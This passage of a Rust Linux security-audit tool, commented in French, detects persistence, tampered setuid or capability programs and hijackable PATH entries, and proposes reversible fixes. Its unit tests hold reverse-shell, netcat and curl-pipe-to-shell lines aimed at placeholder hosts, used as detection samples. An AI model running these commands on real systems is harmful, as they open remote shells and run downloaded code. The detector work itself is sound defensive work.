    cibles_liees.extend(unite(r, f, texte, false, None)?);
    cibles_liees.push(environnement_lie(r)?);
    let nom = f
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    Ok(temoins::temoin(
        &f.to_string_lossy(),
        montre,
        &nom,
        Some(&temoins::etat_du_contenant(f, &lu.octets)?),
        &cibles_liees,
    ))
}

/// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
/// demandé à part sur le terminal ; jamais une unité de session (connexion à distance, écran de connexion), que
/// l'enfant root refuserait. Un nom qu'un geste ne porte pas (forgé, gabarit) laisse tout à la main.
fn juger_services_ajoutes(ajoutes: &[String], gestes: bool) -> Option<Constat> {
    const CAT: &str = "Persistance";
    let affiches: Vec<String> = ajoutes.iter().map(|n| crate::ui::affichable(n)).collect();
    let premier = affiches.first()?.clone();
    let constat = alerte(
        CAT,
        Niveau::Info,
        trf!(
            "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
            "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
            affiches.len(),
            affiches.join(", ")
        ),
    )
    .avec_objet(crate::modele::Objet::de("services", &affiches.join(",")))
    .manuel(
        tr!(
            "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
            "If you do not recognize one, read what it starts before turning it off"
        ),
        &[&format!("systemctl cat {}", crate::commande::sh_chaine(&premier))],
    );
    if !gestes {
        return Some(constat);
    }
    let gestes = crate::machine::defense::tous(
        ajoutes.iter().filter(|n| !gestes_unix::unite_portant_les_sessions(n)),
        |n| gestes_unix::NomUnite::nouveau(n).map(Defense::DesactiverService),
    );
    Some(crate::machine::defense::corriger(
        constat,
        tr!(
            "Désactiver ceux que vous ne reconnaissez pas (chacun demandé à part ; Défaire les remet) ; « systemctl cat <service> » montre ce qu'il lance",
            "Turn off the ones you do not recognize (each asked separately; Undo puts them back); “systemctl cat <service>” shows what it starts"
        ),
        &gestes,
    ))
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
/// Les fichiers de `d`, jusqu'à `profondeur` sous-dossiers plus bas, qui passent `test`.
fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
    for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
        let p = e.path();
        if e.file_type().is_ok_and(|t| t.is_dir()) {
            if profondeur > 0 {
                parcourir(&p, profondeur.saturating_sub(1), trouve, test);
            }
        } else if test(&p) {
            trouve.push(p);
        }
    }
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let (mut anormaux, systeme, capacites) = programmes_privilegies();
    let gestion = Paquets::detecter();
    let (modifies, non_verifies) =
        gestion.map_or((Vec::new(), 0), |g| comparer_aux_paquets(g, &systeme, &mut anormaux));
    let mode = |p: &Path| std::fs::symlink_metadata(p).ok().map(|m| m.mode());
    let caps = capacites.as_deref().unwrap_or_default();
    let chemins_modifies: Vec<std::path::PathBuf> = modifies.iter().map(|(p, _)| p.clone()).collect();
    let gestes_modifies = gestes_de_privilegies(&chemins_modifies, caps, mode);
    let gestes_anormaux = gestes_de_privilegies(&anormaux, caps, mode);
    let modifies: Vec<(String, String)> = modifies
        .into_iter()
        .map(|(p, paquet)| (crate::ui::chemin_affichable(&p), paquet))
        .collect();
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    })
}

/// Les gestes qui retirent leurs droits à ces programmes : le setuid/setgid de ceux qui l'ont (`mode`, lu sans
/// suivre de lien), les capacités de ceux que getcap a listés (`capacites`, chemins réels). Tous ou aucun : un chemin
/// qu'un geste ne porte pas, un programme qui n'a plus rien de privilégié (changé depuis le parcours), ou plus de
/// `defense::GESTES_MAX` gestes, et la liste reste à la main. L'enfant root rejuge chacun (paquet, chemin, sudo, su
/// et pkexec) avant de rien faire.
fn gestes_de_privilegies(
    chemins: &[std::path::PathBuf],
    capacites: &[std::path::PathBuf],
    mode: impl Fn(&Path) -> Option<u32>,
) -> Vec<Defense> {
    use std::os::unix::ffi::OsStrExt;
    let mut gestes = Vec::new();
    for p in chemins {
        let Some(c) = gestes_unix::CheminDesigne::nouveau(p.as_os_str().as_bytes()) else {
            return Vec::new();
        };
        let setuid = mode(p).is_some_and(|m| m & 0o6000 != 0);
        let reel = std::fs::canonicalize(p).unwrap_or_else(|_| p.clone());
        let caps = capacites.iter().any(|k| k == p || *k == reel);
        if !setuid && !caps {
            return Vec::new();
        }
        if setuid {
            gestes.push(Defense::RetirerSetuid(c));
        }
        if caps {
            gestes.push(Defense::RetirerCapacites(c));
        }
    }
    if gestes.len() > crate::machine::defense::GESTES_MAX {
        return Vec::new();
    }
    gestes
}

/// Les programmes privilégiés relevés : ceux des dossiers temporaires et personnels qui donnent des droits (setuid à un
/// autre compte, setgid du groupe root), ceux des dossiers du système (chemin réel, sans doublon), et ceux à capacités
/// (tels que getcap les nomme, puis par leur chemin réel ; `None` : getcap n'a pas répondu).
#[allow(
    clippy::type_complexity,
    reason = "trois listes rendues d'un seul parcours, nommées par la doc"
)]
fn programmes_privilegies() -> (
    Vec<std::path::PathBuf>,
    Vec<std::path::PathBuf>,
    Option<Vec<std::path::PathBuf>>,
) {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    // Par son chemin : sous Debian, /usr/sbin n'est pas dans le PATH d'un compte ordinaire, et getcap n'y serait
    // jamais trouvé (les capacités jamais lues). Un fil refusé par le système : lu ici, après les parcours, jamais
    // une panique (socle::fil).
    let capacites = crate::socle::fil::lancer_ou_ici("getcap", || {
        let getcap = crate::commande::outil_systeme("getcap")?;
        sortie(
            &getcap.to_string_lossy(),
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (home().as_str(), 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let capacites = capacites.map(|v| {
        let mut tous: Vec<std::path::PathBuf> = v.iter().filter_map(|p| std::fs::canonicalize(p).ok()).collect();
        tous.extend(v);
        tous
    });
    (anormaux, systeme, capacites)
}

/// Chaque programme privilégié du système comparé à son paquet : ceux d'aucun paquet rejoignent `anormaux` ; rend les
/// modifiés (chemin, paquet) et le nombre de ceux qui n'ont pas pu être vérifiés.
fn comparer_aux_paquets(
    gestion: Paquets,
    systeme: &[std::path::PathBuf],
    anormaux: &mut Vec<std::path::PathBuf>,
) -> (Vec<(std::path::PathBuf, String)>, usize) {
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(systeme)) {
        match proprietaire {
            Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
            None => anormaux.push(p.clone()),
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0usize);
    // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
    // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre. Un fil refusé par le système :
    // ce paquet se vérifie ici, à son tour (socle::fil).
    let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
    let mut etats = Vec::new();
    for groupe in paquets.chunks(16) {
        std::thread::scope(|s| {
            let fils: Vec<_> = groupe
                .iter()
                .map(|(paquet, fichiers)| {
                    crate::socle::fil::dans_ou_ici(s, "paquet", move || gestion.modifies(paquet, fichiers))
                })
                .collect();
            etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
        });
    }
    for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
        // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
        let etats = etats.into_iter().chain(std::iter::repeat(None));
        for (f, etat) in fichiers.iter().zip(etats) {
            match etat {
                Some(true) => modifies.push((f.clone(), paquet.clone())),
                Some(false) => {}
                None => non_verifies = non_verifies.saturating_add(1),
            }
        }
    }
    (modifies, non_verifies)
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
    /// Les gestes de défense qui retirent leurs droits aux modifiés (`gestes_de_privilegies`) ; vide : à la main.
    pub gestes_modifies: Vec<Defense>,
    /// De même pour les anormaux.
    pub gestes_anormaux: Vec<Defense>,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Critique,
            trf!(
                "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
            &[reinstaller],
        );
        // Retirer ses droits le rend inoffensif tout de suite ; la réinstallation reste à faire (elle les remet,
        // avec le programme d'origine).
        constats.push(crate::machine::defense::corriger(
            constat,
            trf!(
                "Retirer ses droits (setuid, capacités) pour qu'il ne puisse plus servir, puis le remettre depuis les dépôts ({}), lancer l'antivirus et changer vos mots de passe",
                "Remove its rights (setuid, capabilities) so it can no longer be used, then restore it from the repositories ({}), run the antivirus and change your passwords",
                reinstaller
            ),
            gestes_modifies,
        ));
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Eleve,
            trf!(
                "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
            &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
        );
        constats.push(crate::machine::defense::corriger(
            constat,
            tr!(
                "Leur retirer ces droits (setuid, setgid, capacités ; le fichier reste, Défaire les remet), puis chercher d'où ils viennent (ne pas les lancer)",
                "Remove those rights from them (setuid, setgid, capabilities; the file stays, Undo puts them back), then find out where they come from (do not run them)"
            ),
            gestes_anormaux,
        ));
    }
    // Un programme privilégié trouvé ne dit rien des capacités : getcap muet, elles n'ont pas été lues, et c'est dit.
    let trouves = !modifies.is_empty() || !anormaux.is_empty();
    if !capacites_lues && trouves {
        constats.push(crate::machine::impossible(
            "Fichiers suspects",
            tr!(
                "capacités des programmes : getcap absent",
                "program capabilities: getcap missing"
            ),
        ));
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    std::thread_local! {
        /// La dernière racine que `persistance_dans` a lue, sur ce fil d'essai.
        pub(super) static RACINE_LUE: std::cell::RefCell<Option<std::path::PathBuf>> =
            const { std::cell::RefCell::new(None) };
        /// L'uid du compte que voit `uid_du_compte` sur ce fil d'essai (valeur inventée).
        pub(super) static UID_DU_COMPTE: std::cell::Cell<u32> = const { std::cell::Cell::new(1000) };
    }

    /// D7a : les lignes suspectes des fichiers du système partent par des gestes de défense (une par ligne, sans
    /// doublon) ; une seule ligne ailleurs (dossier personnel, crontab du compte, variable de la session), ou trop de
    /// lignes, et tout reste à la main.
    #[test]
    fn lancements_retires_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let lancement = |retraits: Vec<Option<(&str, &str)>>| {
            let n = retraits.len();
            constat_des_lancements(Lancements {
                critiques: Vec::new(),
                suspects: (0..n).map(|i| format!("suspect {i}")).collect(),
                sources: Vec::new(),
                retraits: retraits
                    .into_iter()
                    .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                    .collect(),
                ..Lancements::default()
            })
            .correctif
            .unwrap()
        };
        let k = lancement(vec![
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/cron.d/maj", "* * * * * root curl http://exemple.test/x | sh")),
        ]);
        assert!(k.automatique);
        assert_eq!(k.commandes.len(), 2);
        assert!(
            k.commandes
                .iter()
                .all(|l| matches!(analyser(l), Some(GesteUnix::Defense(Defense::RetirerLigne(..), _))))
        );
        assert!(matches!(k.defaire, crate::machine::Defaire::Gestes(ref g) if g.len() == 2));
        // Un mélange : tout à la main.
        assert!(!lancement(vec![Some(("/etc/ld.so.preload", "/tmp/.x.so")), None]).automatique);
        assert!(
            !lancement(vec![
                Some(("/etc/ld.so.preload", "/tmp/.x.so")),
                Some(("/home/alice/.bashrc", "curl x | sh"))
            ])
            .automatique
        );
        // Un fichier au nom piégé n'est jamais désigné.
        assert!(!lancement(vec![Some(("/etc/cron.d/a b", "curl x | sh"))]).automatique);
        // Trop de lignes : à la main.
        let noms: Vec<String> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| format!("/etc/cron.d/t{i}"))
            .collect();
        assert!(!lancement(noms.iter().map(|f| Some((f.as_str(), "curl x | sh"))).collect()).automatique);
    }

    /// D7a : chaque service ajouté à la main se désactive par un geste, jamais une unité de session ni du réseau ; un
    /// nom qu'un geste ne porte pas laisse tout à la main, et le nom montré dans la commande est échappé.
    #[test]
    fn services_ajoutes_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let noms = |v: &[&str]| v.iter().map(|n| (*n).to_string()).collect::<Vec<_>>();
        let k = juger_services_ajoutes(
            &noms(&["maj.timer", "nftables.service", "sauvegarde.service", "sshd.service"]),
            true,
        )
        .unwrap()
        .correctif
        .unwrap();
        assert!(k.automatique);
        let unites: Vec<String> = k
            .commandes
            .iter()
            .map(|l| match analyser(l) {
                Some(GesteUnix::Defense(Defense::DesactiverService(u), _)) => u.as_str().to_string(),
                _ => panic!("geste attendu : {l}"),
            })
            .collect();
        assert_eq!(unites, ["maj.timer", "sauvegarde.service"]);
        assert!(
            !juger_services_ajoutes(&noms(&["a.service"]), false)
                .unwrap()
                .correctif
                .unwrap()
                .automatique
        );
        let k = juger_services_ajoutes(&noms(&["a.service", "x;reboot.service"]), true)
            .unwrap()
            .correctif
            .unwrap();
        assert!(!k.automatique);
        assert!(
            k.commandes.iter().all(|c| c.starts_with("systemctl cat '")),
            "{:?}",
            k.commandes
        );
        assert!(juger_services_ajoutes(&[], true).is_none());
    }

    /// Essai QEMU D7a (Debian) : getcap muet et un setuid hors paquet trouvé, les capacités non lues sont dites à part
    /// (jamais tues derrière l'alerte) ; getcap lu, rien de plus.
    #[test]
    fn capacites_non_lues_dites_meme_avec_une_alerte() {
        let releve = |capacites_lues| Releve {
            modifies: Vec::new(),
            anormaux: vec![std::path::PathBuf::from("/usr/local/bin/alice-x")],
            systeme: 3,
            gestion: true,
            non_verifies: 0,
            capacites_lues,
            path_dangereux: Vec::new(),
            reinstaller: String::new(),
            gestes_modifies: Vec::new(),
            gestes_anormaux: Vec::new(),
        };
        let muet = juger_fichiers_suspects(&releve(false));
        assert!(muet.iter().any(|c| !c.verifie && c.message.contains("getcap")));
        let lu = juger_fichiers_suspects(&releve(true));
        assert!(lu.iter().all(|c| c.verifie));
        assert_eq!(muet.len(), lu.len() + 1);
    }

    /// D7a : un programme privilégié perd son setuid ou ses capacités par un geste ; tous ou aucun : un chemin qu'un
    /// geste ne porte pas, un programme qui n'a plus rien de privilégié ou une liste trop longue laisse tout à la main.
    #[test]
    fn privilegies_par_gestes() {
        use crate::machine::gestes_unix::Defense;
        use std::path::PathBuf;
        const AUCUN: [Defense; 0] = [];
        let p = |s: &str| PathBuf::from(s);
        let modes = |m: u32| move |_: &Path| Some(m);
        let g = gestes_de_privilegies(
            &[p("/tmp/alice-x"), p("/tmp/alice-y")],
            &[p("/tmp/alice-y")],
            |c: &Path| {
                Some(if c == Path::new("/tmp/alice-x") {
                    0o104_755
                } else {
                    0o100_755
                })
            },
        );
        assert!(
            matches!(g.as_slice(), [Defense::RetirerSetuid(a), Defense::RetirerCapacites(b)]
                if a.octets() == b"/tmp/alice-x" && b.octets() == b"/tmp/alice-y"),
            "{g:?}"
        );
        let g = gestes_de_privilegies(&[p("/tmp/alice-x")], &[p("/tmp/alice-x")], modes(0o102_755));
        assert_eq!(g.len(), 2);
        // Plus rien de privilégié (changé depuis le parcours), ou lu par personne : à la main.
        assert_eq!(
            gestes_de_privilegies(&[p("/tmp/alice-x"), p("/tmp/alice-z")], &[], |c: &Path| {
                (c == Path::new("/tmp/alice-x")).then_some(0o104_755)
            }),
            AUCUN
        );
        // Chemin qu'un geste ne porte pas : relatif, à « .. », vide.
        for forge in ["tmp/x", "/tmp/../usr/bin/sudo", "", "/tmp/x/"] {
            assert!(
                gestes_de_privilegies(&[p("/tmp/alice-x"), p(forge)], &[], modes(0o104_755)).is_empty(),
                "{forge}"
            );
        }
        let neuf: Vec<PathBuf> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| p(&format!("/tmp/alice{i}")))
            .collect();
        assert_eq!(gestes_de_privilegies(&neuf, &[], modes(0o104_755)), AUCUN);
        assert_eq!(gestes_de_privilegies(&[], &[], modes(0o104_755)), AUCUN);
    }

    /// La ligne retirée est celle du fichier, fin « \r » comprise : l'empreinte que le fils root recalcule.
    #[test]
    fn ligne_telle_qu_ecrite() {
        assert_eq!(telle_qu_ecrite("a\r\nb\n", "a"), "a\r");
        assert_eq!(telle_qu_ecrite("a\nb", "b"), "b");
    }

    /// Le bilan lit la persistance depuis la vraie racine « / » : une autre (relative, ou absolue comme « /x »), le
    /// corpus, qui donne la sienne à `persistance_dans`, ne la verrait pas ; la racine lue est comparée à « / ».
    #[test]
    fn le_bilan_lit_depuis_la_racine() {
        RACINE_LUE.with(|r| *r.borrow_mut() = None);
        let _ = persistance();
        assert_eq!(
            RACINE_LUE.with(|r| r.borrow().clone()),
            Some(std::path::PathBuf::from("/"))
        );
    }

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),          // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40_777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40_755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
